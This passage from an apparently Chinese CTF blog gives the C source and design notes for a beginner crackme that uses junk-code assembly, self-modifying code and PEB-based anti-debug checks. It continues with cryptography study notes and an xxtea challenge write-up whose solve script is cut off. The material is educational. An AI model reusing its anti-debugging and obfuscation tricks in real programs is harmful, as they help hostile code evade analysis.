class="hljs-string">&quot;%99s&quot;</span>,&amp;flag);<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;jz lable1;&quot;</span><br>            <span class="hljs-string">&quot;call lable1;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable1:;&quot;</span><br>            );<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(flag)!=<span class="hljs-number">24</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcl&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    hua(flag);<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable8;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable8:;&quot;</span><br>            );<br>    fuck(flag);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(flag);i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(flag[i] != fc[i])<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What a pity!!!&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you win!!!&quot;</span>);<br>    system(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fuck</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *flag)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>((flag[i]^<span class="hljs-number">8</span>) != check[i])<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcl&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(flag[<span class="hljs-built_in">strlen</span>(flag)<span class="hljs-number">-1</span>] != <span class="hljs-number">177</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcl&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(flag);i+=<span class="hljs-number">8</span>)<br>        smc(&amp;flag[i],key);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hua</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> temp1,temp2;<br>        __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable3;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable3:;&quot;</span><br>            );<br>    double_smc(change,<span class="hljs-number">222</span>,<span class="hljs-number">0x12</span>);       <span class="hljs-comment">//double smc here</span><br>    <span class="hljs-comment">//change(smc,130,a[strlen(a)-1]);</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(a)/<span class="hljs-number">4</span>;i+=<span class="hljs-number">4</span>)<br>    &#123;<br>        a[i] += <span class="hljs-number">12</span>;<br>        a[i+<span class="hljs-number">1</span>] += <span class="hljs-number">34</span>;<br>        __asm__ __volatile__(<br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;jz lable2;&quot;</span><br>            <span class="hljs-string">&quot;call lable2;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable2:;&quot;</span><br>            );<br>        a[i+<span class="hljs-number">2</span>] += <span class="hljs-number">56</span>;<br>        a[i+<span class="hljs-number">3</span>] += <span class="hljs-number">78</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(a);i++)<br>    &#123;<br>        temp1 = a[i]&lt;&lt;<span class="hljs-number">3</span>;<br>        temp2 = a[i]&gt;&gt;<span class="hljs-number">5</span>;<br>        __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable:;&quot;</span><br>            );<br>        a[i] = temp1|temp2;<br>        a[i] ^= <span class="hljs-number">90</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">smc</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span>* v, <span class="hljs-keyword">uint32_t</span>* k)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-keyword">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0</span>, i;<br>    <span class="hljs-keyword">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-keyword">uint32_t</span> k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        sum += delta;<br>        v0 += ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        v1 += ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">double_smc</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a,<span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> temp;<br>    DWORD dwOldFlag;<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;jz lable6;&quot;</span><br>            <span class="hljs-string">&quot;call lable2;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable6:;&quot;</span><br>            );<br>    <span class="hljs-keyword">if</span>(!VirtualProtect(a,<span class="hljs-built_in">size</span>,PAGE_READWRITE,&amp;dwOldFlag))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">size</span>;i++)<br>        &#123;<br>            *(a+i) ^= key;<br>        &#125;<br>        __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable7;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable7:;&quot;</span><br>            );<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-keyword">sizeof</span>(exit_0);i++)<br>        &#123;<br>            temp = *(a+i);<br>            *(a+i) = exit_0[i];<br>            exit_0[i] = temp;<br>        &#125;<br>    <span class="hljs-keyword">if</span>(anti_debug1(a))<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debug everyday makes C0ss4ck a dull boy!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!VirtualProtect(a,<span class="hljs-built_in">size</span>,dwOldFlag,&amp;dwOldFlag))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    change(smc,<span class="hljs-number">206</span>,<span class="hljs-number">0x34</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">anti_debug1</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;jz lable5;&quot;</span><br>            <span class="hljs-string">&quot;call lable2;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable5:;&quot;</span><br>            );<br>    <span class="hljs-keyword">if</span>(!anti_debug2())<br>    &#123;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-keyword">sizeof</span>(exit_0);i++)<br>        &#123;<br>            *(a+i) = exit_0[i];<br>        &#125;<br>    &#125;<br>        __asm__(<br>        <span class="hljs-string">&quot;mov eax, fs:[0x30];&quot;</span><br>        <span class="hljs-string">&quot;mov eax,[eax+0x68];&quot;</span><br>        <span class="hljs-string">&quot;and eax,0x70;&quot;</span><br>    );<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">anti_debug2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov eax, fs:[0x30];&quot;</span><br>        <span class="hljs-string">&quot;movzx eax,byte ptr [eax+2];&quot;</span><br>    );<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a,<span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    DWORD dwOldFlag;<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable4;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable4:;&quot;</span><br>            );<br>    <span class="hljs-keyword">if</span>(!VirtualProtect(a,<span class="hljs-built_in">size</span>,PAGE_READWRITE,&amp;dwOldFlag))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">size</span>;i++)<br>        &#123;<br>            *(a+i) ^= key;<br>            *(a+i) = (*(a+i)&lt;&lt;<span class="hljs-number">4</span>) | (*(a+i)&gt;&gt;<span class="hljs-number">4</span>);<br>        &#125;<br>    <span class="hljs-keyword">if</span>(!VirtualProtect(a,<span class="hljs-built_in">size</span>,dwOldFlag,&amp;dwOldFlag))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>出题思路：<br>主要考察新生对ctf中常见的对抗逆向技术<br>分别是<br>anti_debug<br>Smc<br>Junk_code<br>加密部分写的不怎么复杂就一个TEA加上一些加加减减。<br>这些对大型比赛来说也就是个签到题把//或者签到题都算不上<br>源码解析：<br>前言：这是我六个月前第一次出题的代码有很多不足，有些还待改进。<br>有部分需要修改<br>exit_0是antibug中会使用到的<br>主要是对change函数开头赋值成exit(0)，故机器码需要根据最后生成的可执行文件修改。<br>还有就是花指令部分，生成完我才发现jmp的那个花指令没有起到我想要的效果，直接修改机器码E8(call)。<br>另外就是smc部分我只写了解密，生成完后肯定是不能运行的还需要patch，写脚本来加密，实现起来也不难。Idc即可</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;idc.idc&gt;<br>static main<span class="hljs-literal">()</span><br>&#123;<br>    auto addr = <span class="hljs-number">0x0040166A</span>;   <br>    auto i = <span class="hljs-number">0</span>;<br>    auto temp;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;addr+i&lt;<span class="hljs-number">0x00401738</span>;i++)   <br>    &#123;<br>        temp = ((<span class="hljs-constructor">Byte(<span class="hljs-params">addr</span>+<span class="hljs-params">i</span>)</span>&gt;&gt;<span class="hljs-number">4</span>)<span class="hljs-pattern-match">|(<span class="hljs-constructor">Byte(<span class="hljs-params">addr</span>+<span class="hljs-params">i</span>)</span>&lt;&lt;4))&amp;0xff;</span><br><span class="hljs-pattern-match">        <span class="hljs-constructor">PatchByte(<span class="hljs-params">addr</span>+<span class="hljs-params">i</span>,<span class="hljs-params">temp</span>^0x34)</span>;   </span><br><span class="hljs-pattern-match">    &#125;</span><br><span class="hljs-pattern-match">&#125;</span><br></code></pre></td></tr></table></figure><p>关于check部分一开始check了格式//事实上是多次一举，后面tea后又check了全部flag<br>还有就是strlen函数我发现有一个很不好的地方<br>套用在for循环中时，每一次都会check一次strlen，这样就出现一个问题，就是当tea后密文出现0，这样strlen就会被有差错，当初我设定的flag时nctf…然后加密一轮后出现0，直接不加密了，时间问题没有好好优化就把开头改成了NCTF，其实改成24就行，毕竟前面已经限制了长度必须为24<br>还有就是花指令部分<br>主要出现了俩种花指令，一种是栈指针还有一种是jmp的。<br>反调试部分我才用使用汇编来写，这样的话ida不会反编译出函数，比如antidebug2其实就是isdebuggerpresent而Ida并不会识别出该函数。<br>smc部分我采用了double_smc,这样就不能通过data xref来追踪。但是意义不大。。。熟练的人一下就能看出，smc部分出现的anti_debug,下面printf一句debug everyday可以一下看出这是反调试函数，但是如果不仔细逆向直接把该函数patch的话到change函数就直接exit了，里面紧跟着的又是一个反调试并把之前保存在exit的值重新赋给change开头</p><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>面向字节的密码<br>state：4*4矩阵（key 128位，列数为6/8当key为192或256时）</p><h2 id="addroundkey"><a href="#addroundkey" class="headerlink" title="addroundkey"></a>addroundkey</h2><p>状态矩阵与子密钥xor</p><h3 id="密钥编排"><a href="#密钥编排" class="headerlink" title="密钥编排"></a>密钥编排</h3><p>state每列四个进行操作<br>第四列(key4) key5 =（key4）rotword —&gt; subbytes —&gt; xor key1<br>key5 —&gt; xor key2<br>。。。<br>每四次一次rotworld subbytes </p><h2 id="subbytes"><a href="#subbytes" class="headerlink" title="subbytes"></a>subbytes</h2><p>s_box s_box-1 互逆<br>对应取值为在GF(2m)中的逆元经过仿射后的值<br>比如c2逆元为2f经过仿射后为25就是S(C2)的值<br>S(A)=B<br>非线性：S(A+B) != S(A)+S(B)</p><h2 id="扩散层"><a href="#扩散层" class="headerlink" title="扩散层"></a>扩散层</h2><p>将单个位的影响扩散到整个状态，且都为线性操作<br>也是fault的写法</p><h3 id="shiftrows"><a href="#shiftrows" class="headerlink" title="shiftrows"></a>shiftrows</h3><p>将状态的每行左移<br>第一行不变<br>第二行移1<br>第三行2<br>第四行3<br>不改变值</p><h3 id="mixcolumn"><a href="#mixcolumn" class="headerlink" title="mixcolumn"></a>mixcolumn</h3><p>和固定矩阵相乘，扩大字节影响范围。<br>具体乘法实现是在GF(2^8)中实现的</p><h2 id="逆向mixcolumn"><a href="#逆向mixcolumn" class="headerlink" title="逆向mixcolumn"></a>逆向mixcolumn</h2><p>乘上在伽罗瓦域上的互逆矩阵</p><h2 id="逆向shiftrow"><a href="#逆向shiftrow" class="headerlink" title="逆向shiftrow"></a>逆向shiftrow</h2><p>可以理解为rightrow</p><h2 id="逆向subbytes"><a href="#逆向subbytes" class="headerlink" title="逆向subbytes"></a>逆向subbytes</h2><p>sbox逆操作先仿射变换逆然后求解逆元即可</p><h1 id="AES-DFA"><a href="#AES-DFA" class="headerlink" title="AES_DFA"></a>AES_DFA</h1><p>例子：round9<br>在最后一轮mixcol之前出现了单字节fault<br>经过mix和shift等操作影响到四个字节<br>和正确密文xor得出表达式可进行约束求解<br>对于aes128需要每列俩个fault数据，足够可约束出key10的4个byte<br>所以总共需要8组fault数据和一组正确密文<br>这样就能够求出key10<br>然后就能反推密钥编排求出key</p><h2 id="XCTF-FINAL-2019-FAULT"><a href="#XCTF-FINAL-2019-FAULT" class="headerlink" title="XCTF-FINAL 2019 FAULT"></a>XCTF-FINAL 2019 FAULT</h2><p><img src="33.png" alt="33"><br>可以看到aes这部分出现了一个很明显的问题<br>再最后俩次mc之前有一次xor<br>这样就会产生fault<br>经过俩次俩次mcfault影响到16字节<br>v8是0，但是可以通过利用溢出来修改<br>获取俩组错误密文和一组正确明文就可以求解出key10<br>然后key就可以求出来了<br>看了下其他队伍的wp发现貌似还有其他的写法。。。<br>直接利用printf打出来那种。。。<br>哎。。。太菜了<br>学了波数学算是搞懂原理了</p><h1 id="RSA加密与解密"><a href="#RSA加密与解密" class="headerlink" title="RSA加密与解密"></a>RSA加密与解密</h1><h2 id="平方乘法"><a href="#平方乘法" class="headerlink" title="平方乘法"></a>平方乘法</h2><p>快速计算指数的方法<br>指数用二进制表示<br>初始化平方<br>如果为1<br>平方后mul<br>如果为0<br>直接平方<br>原理其实就是在逐位复现二进制</p><h2 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h2><p>没怎么看懂。。。<br>但是百度了下发现是求解同余方程的</p><h2 id="寻找大素数"><a href="#寻找大素数" class="headerlink" title="寻找大素数"></a>寻找大素数</h2><h2 id="费马素性检测"><a href="#费马素性检测" class="headerlink" title="费马素性检测"></a>费马素性检测</h2><p>用费马定理推，不满足则为合数<br>满足则可能为素数<br>//特例是卡迈尔克数</p><h2 id="Miller-Rabin素性测试"><a href="#Miller-Rabin素性测试" class="headerlink" title="Miller-Rabin素性测试"></a>Miller-Rabin素性测试</h2><p>p = 2^x * r<br>a^r = p-1<br>a(rand) // count = s</p><h1 id="Diffie-Hellman密钥交换"><a href="#Diffie-Hellman密钥交换" class="headerlink" title="Diffie-Hellman密钥交换"></a>Diffie-Hellman密钥交换</h1><p>选择大素数p与整数a<br>p作为模数<br>甲方选择key1<br>乙方选择key2<br>a^key1 mod p -&gt; 乙方<br>b^key2 mod p -&gt; 甲方<br> 然后再一次的指数运算<br>这样双方的值就相同，即是传输的key</p><h1 id="代数知识"><a href="#代数知识" class="headerlink" title="代数知识"></a>代数知识</h1><h2 id="群"><a href="#群" class="headerlink" title="群"></a>群</h2><p>群指一个元素集合G以及联合G内两个元素的操作o的集合。<br>1.群操作o是封闭的，对于ab in G ，aob in G始终成立<br>2.群操作可结合<br>3.存在一个元素1 in G，对所有的a in G均满足ao1=1oa=a，这个元素称为中性元或单位元<br>4.对每个元素a in G，存在一个元素a-1 in G，满足aoa-1=a-1oa=1，则a-1称为a的逆元<br>5.对所有的a，b in G 都额外满足aob=boa，则群G称为阿贝尔群或可交换群。</p><h2 id="元素的阶"><a href="#元素的阶" class="headerlink" title="元素的阶"></a>元素的阶</h2><p>a^k = 1 mod n<br>k为阶</p><h2 id="循环群"><a href="#循环群" class="headerlink" title="循环群"></a>循环群</h2><h3 id="有限群"><a href="#有限群" class="headerlink" title="有限群"></a>有限群</h3><p>一个群是有限的仅当他拥有有限个元素群G的阶或基可以表示为｜G｜<br>Zn，+的基为n<br>Zn，·的基为n的欧拉函数，Zn是由小于n且与n互素的正整数的集合</p><h3 id="元素的阶-1"><a href="#元素的阶-1" class="headerlink" title="元素的阶"></a>元素的阶</h3><p>a^k=1 k为阶</p><h3 id="循环群-1"><a href="#循环群-1" class="headerlink" title="循环群"></a>循环群</h3><p>群G包含一个有拥有最大阶的a=｜G｜，就是循环群，a为原根（本原元）或生成元</p><p>对于每个素数p Zp都是一个阿贝尔有限循环群<br>有限循环群G的本原元的个数为｜G｜的欧拉函数<br>｜G｜为素数时，a!=1的元素都是本原元</p><h2 id="子群"><a href="#子群" class="headerlink" title="子群"></a>子群</h2><p>（G，o）是个循环群，则G内每一个满足ord（a）=s的元素a都是拥有s个元素的循环子群的本原元</p><h2 id="拉格朗日定理"><a href="#拉格朗日定理" class="headerlink" title="拉格朗日定理"></a>拉格朗日定理</h2><p>假设H为G的一个子群，则｜H｜可以整除｜G｜。</p><p>//todo</p><h1 id="基本协议"><a href="#基本协议" class="headerlink" title="基本协议"></a>基本协议</h1><p>Bob公开keypub 对消息x进行哈希函数生成z，然后用keypri对z进行签名为s，收方Alice验证s解密后是否为z即可。</p><h1 id="哈希函数的安全要求"><a href="#哈希函数的安全要求" class="headerlink" title="哈希函数的安全要求"></a>哈希函数的安全要求</h1><p>1.抗第一原像性（单向性）<br>2.抗第二原像性（弱抗冲突性）<br>3.抗冲突性（强抗冲突性）</p><h2 id="弱抗冲突性"><a href="#弱抗冲突性" class="headerlink" title="弱抗冲突性"></a>弱抗冲突性</h2><p>鸽笼原理证明了弱抗冲突性对于哈希函数来说必存在。所以需要满足的条件就是正向容易逆向难，给定x1与其对应的哈希不能找到消息x2生成同样的哈希</p><h2 id="强抗冲突性与生日攻击"><a href="#强抗冲突性与生日攻击" class="headerlink" title="强抗冲突性与生日攻击"></a>强抗冲突性与生日攻击</h2><p>生日攻击简介：<br>至少出现多少人才会出现生日冲突概率大于1/2<br>答案是23个<br>不冲突概率为（1-1/365）（1-2/365）。。。<br>用1-该值即可<br>当40人时，冲突概率达到90%<br>生日攻击是对所有哈希函数的通用攻击，该攻击的存在决定了哈希函数的输出位数至少为128位<br>测试数据至少约为2^(n/2)<br>n为位数<br>对于主流哈希函数还有更快的攻击就是数学冲突攻击</p><h1 id="哈希函数概述"><a href="#哈希函数概述" class="headerlink" title="哈希函数概述"></a>哈希函数概述</h1><h2 id="专用哈希函数MD4家族"><a href="#专用哈希函数MD4家族" class="headerlink" title="专用哈希函数MD4家族"></a>专用哈希函数MD4家族</h2><p>主要指转为哈希函数而专门设计的算法</p><h1 id="对称密码学与非对称密码学"><a href="#对称密码学与非对称密码学" class="headerlink" title="对称密码学与非对称密码学"></a>对称密码学与非对称密码学</h1><h2 id="对称密码学"><a href="#对称密码学" class="headerlink" title="对称密码学"></a>对称密码学</h2><p>存在问题<br>1.密钥的分配<br>因为信道不安全<br>2.密钥的个数<br>对于一个很大的网络需要存储的密钥有很多对<br>3.不可实现不可否认性</p><h2 id="非对称密码学"><a href="#非对称密码学" class="headerlink" title="非对称密码学"></a>非对称密码学</h2><p>key分为公钥与私钥<br>公钥公开，用户用公钥加密数据后，收方可用私钥来解密<br>具体的实现需要一个单向函数<br>准确来说就是逆运算即使用已知的最好的算法也需要花费很长的时间，但是正向运算足够快。<br>目前来说满足的只有大整数分解问题，离散对数问题还有椭圆曲线。</p><h2 id="数学知识-1"><a href="#数学知识-1" class="headerlink" title="数学知识"></a>数学知识</h2><h3 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h3><p>gcd（最大公约数）<br>求解最大公约数通过mod迭代直到为0即可求得最大公约数</p><h3 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h3><p>在欧几里得算法的基础上将最大公约数以线性的方式表示<br>求解逆元<br>逆元存在条件当且仅当gcd=1即互素<br>求解a mod b的逆元可用EEA表示gcd<br>然后对应a的系数就是逆元</p><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>相应环内与之互素的个数<br>如果m可因式分解那么就有公式可以套用</p><h3 id="费马小定理与欧拉定理"><a href="#费马小定理与欧拉定理" class="headerlink" title="费马小定理与欧拉定理"></a>费马小定理与欧拉定理</h3><p>费马小定理<br>a为整数p为素数<br>则a^p = a(mod p)//a的p次方<br>推广到整数就是欧拉定理//使用条件是a与m互素<br>a^o(m)=1modm<br>费马小定理就是欧拉的特殊情况//当p为素数时</p><h2 id="基于分组密码的哈希函数"><a href="#基于分组密码的哈希函数" class="headerlink" title="基于分组密码的哈希函数"></a>基于分组密码的哈希函数</h2><p>输入分组进入压缩函数迭代<br>输出为最后一轮压缩函数的输出<br>// Merkle-Damgard结构</p><h1 id="红帽杯"><a href="#红帽杯" class="headerlink" title="红帽杯"></a>红帽杯</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>题目名称是xx<br>可以想到是xxtea<br>首先程序检查输入长度是否为19然后进行一次xxtea加密<br><img src="34.png" alt="34"><br>加密的key是输入的前四个字符<br>然后有一个换位xor的操作逆过来整一下就行了<br><img src="35.png" alt="35"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> xxtea<br>a = [<span class="hljs-number">0xCE</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x9B</span>,<br>  <span class="hljs-number">0x20</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC8</span>,<br>  <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xFA</span>]<br>C = [<span class="hljs-number">0</span>]*<span class="hljs-number">24</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)-<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i/<span class="hljs-number">3</span>):<br>        a[i] ^= a[j]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    C[i] = a[i]<br>encrypt_data = <span class="hljs-string">&#x27;&#x27;</span><br>A = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0xA</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>,<span class="hljs-number">0xE</span>,<span class="hljs-number">0xF</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x18</span>]<br>B = [<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xA</span>,<span class="hljs-number">0xF</span>,<span 